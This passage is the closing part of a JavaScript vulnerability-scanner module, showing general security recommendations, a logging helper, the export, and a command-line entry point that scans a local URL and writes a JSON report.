                        .some(v => ['CRITICAL', 'HIGH'].includes(v.severity)) ? 'HIGH' : 'MEDIUM'
                });
            }
        });

        // General recommendations
        recommendations.push(
            { category: 'General', recommendation: 'Regular security audits and penetration testing', priority: 'HIGH' },
            { category: 'General', recommendation: 'Implement Web Application Firewall (WAF)', priority: 'MEDIUM' },
            { category: 'General', recommendation: 'Security awareness training for developers', priority: 'MEDIUM' },
            { category: 'General', recommendation: 'Automated security testing in CI/CD pipeline', priority: 'HIGH' }
        );

        return recommendations;
    }

    /**
     * Logging utility
     */
    log(message) {
        if (this.verbose) {
            console.log(message);
        }
    }
}

// Export for use
module.exports = { VulnerabilityScanner };

// CLI usage
if (require.main === module) {
    const scanner = new VulnerabilityScanner({
        baseURL: process.argv[2] || 'http://localhost:3000',
        output: process.argv[3] || './vulnerability-report.json',
        verbose: process.argv.includes('--verbose')
    });

    scanner.runScan().catch(console.error);
} 